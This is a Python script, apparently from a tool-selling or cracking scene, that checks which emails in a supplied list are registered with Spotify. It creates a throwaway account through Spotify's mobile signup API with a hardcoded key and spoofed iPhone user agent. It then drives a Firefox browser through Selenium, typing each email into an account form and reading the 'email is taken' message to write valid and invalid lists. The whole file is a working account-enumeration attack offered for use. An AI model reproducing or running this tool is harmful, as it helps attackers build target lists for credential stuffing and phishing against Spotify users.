#!/usr/bin/python
import time
import zipfile
import colorama
import urllib.request,shutil,os
import platform
import urllib.request
import tarfile
import string,requests
import webbrowser,random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
print("""\033[93m
    ___                         _______   __
   /   |  _________  ____      /_  __/ | / /
  / /| | / ___/ __ \/ __ \______/ / /  |/ /  Facebook : fb.com/amyr.gov.tn
 / ___ |/ /  / /_/ / / / /_____/ / / /|  /  Telegram : @aron_tn
/_/  |_/_/   \____/_/ /_/     /_/ /_/ |_/  ICQ : @aron_tn
                       
 {a}Spotify Email Valid Checker ProxyLess
 {a}Coded By {b}: {a}ARON-TN
""".format(a="\033[92m", b="\033[94m"))
print('{b}[+] {a}download files .....'.format(a="\033[92m", b="\033[94m"))
if os.name=='nt':
   if platform.architecture()[0] == "32bit" :
    url = 'https://github.com/mozilla/geckodriver/releases/download/v0.27.0/geckodriver-v0.27.0-win64.zip'
    file_name = 'required.zip'
   elif platform.architecture()[0] == "64bit" :
    url = 'https://github.com/mozilla/geckodriver/releases/download/v0.27.0/geckodriver-v0.27.0-win32.zip'
    file_name = 'required.zip'
else:
    url = 'https://github.com/mozilla/geckodriver/releases/download/v0.27.0/geckodriver-v0.27.0-linux64.tar.gz'
if os.name=='nt':
 with urllib.request.urlopen(url) as response, open(file_name, 'wb') as out_file:
    shutil.copyfileobj(response, out_file)
    with zipfile.ZipFile(file_name) as zf:
        zf.extractall()
 with zipfile.ZipFile(file_name, 'r') as zip_ref:
    zip_ref.extractall()
 os.remove(file_name)
else:
 thetarfile = url
 ftpstream = urllib.request.urlopen(thetarfile)
 thetarfile = tarfile.open(fileobj=ftpstream, mode="r|gz")
 thetarfile.extractall()
print('{b}[+] {a}Done .'.format(a="\033[92m", b="\033[94m"))
parpiro=input('{b}[+] {a}Your List : '.format(a="\033[92m", b="\033[94m"))
letters = string.ascii_lowercase
NAME=''.join(random.choice(letters) for i in range(4))
amm='Bot'+''.join(random.choice(letters) for i in range(6))+'@aron.tn'
data={
    'gender':'male',
    'password':'amir23456@',
    'password_repeat':'amir23456@',
    'birth_month':'8',
    'birth_year':'2000',
    'creation_point':'client_mobile',
    'email':amm,
    'birth_day':'1',
    'displayname':NAME,
    'key':'bff58e9698f40080ec4f9ad97a2f21e0',
    'platform':'iOS-ARM',
    'creation_flow':'mobile_email',
    'iagree':'1',
}
head={
    'content-type':'application/x-www-form-urlencoded',
    'Host':'spclient.wg.spotify.com',
    'Content-Type':'application/x-www-form-urlencoded',
    'Connection':'keep-alive',
    'Accept':'*/*',
    'User-Agent':'Spotify/8.5.7 iOS/13.5.1 (iPhone12,8)',
    'Accept-Language':'en, en;q=0.01',
    'Content-Length':'283',
    'Accept-Encoding':'gzip, deflate, br',
}
response=requests.post('https://spclient.wg.spotify.com/signup/public/v1/account',headers=head,data=data).json()
browser = webdriver.Firefox()
browser.get("https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-GB")
with open(parpiro, "rb") as f:
 login = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "login-username")))
 login.clear()
 login.send_keys(amm)
 passw = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "login-password")))
 passw.clear()
 passw.send_keys('amir23456@')
 WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/form/div[3]/div[2]/button'))).click()
 time.sleep(3)
 amir=browser.page_source
 if 'Incorrect username or password.' in amir:
  login = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "login-username")))
  login.clear()
  print('{b}+++++++\n{a}Sadly I can"t create an account Please Insert a Free Acoount And thanks ! XD {b}+++++++'.format(a="\033[92m", b="\033[94m"))
  elogin=input('{b}[+] {a}Your Email : '.format(a="\033[92m", b="\033[94m"))
  elpass=input('{b}[+] {a}Your Password : '.format(a="\033[92m", b="\033[94m"))
  login.send_keys(str(elogin))
  passw = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "login-password")))
  passw.clear()
  passw.send_keys(str(elpass))
  WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/form/div[3]/div[2]/button'))).click()
  time.sleep(3)
 WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div[2]/div[3]/div[2]/div/article[1]/div/a'))).click()
 WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div[4]/div/div[3]/footer/nav/div[4]/a'))).click()
 WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.XPATH, '/html/body/div[2]/div[2]/ul/li[87]/a/div/div[2]'))).click()
 time.sleep(3)
 for line in f:
   line = line.decode('utf-8')
   email = line.strip()
   try:
    Test = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "email")))
    Test.clear()
    Test.send_keys(str(email))
    bb = WebDriverWait(browser, 5).until(ec.visibility_of_element_located((By.ID, "password")))
    bb.clear()
    bb.send_keys('amir23456@')
    time.sleep(1)
    page_source = browser.page_source
    if "We're sorry, that email is taken." in page_source :
     print('{t}[+] '.format(t='\033[92m')+email+' ===> valid')
     with open("validSpotify.txt", "a+") as wrong:
      wrong.write(email+"\n")
     pass
    else:
     print('{k}[-] '.format(k='\033[91m')+email+' ===> invalid')
     with open("InvalidSpotify.txt", "a+") as wrong:
      wrong.write(email+"\n")
     pass
   except Exception as err:
    print(err)
browser.close()
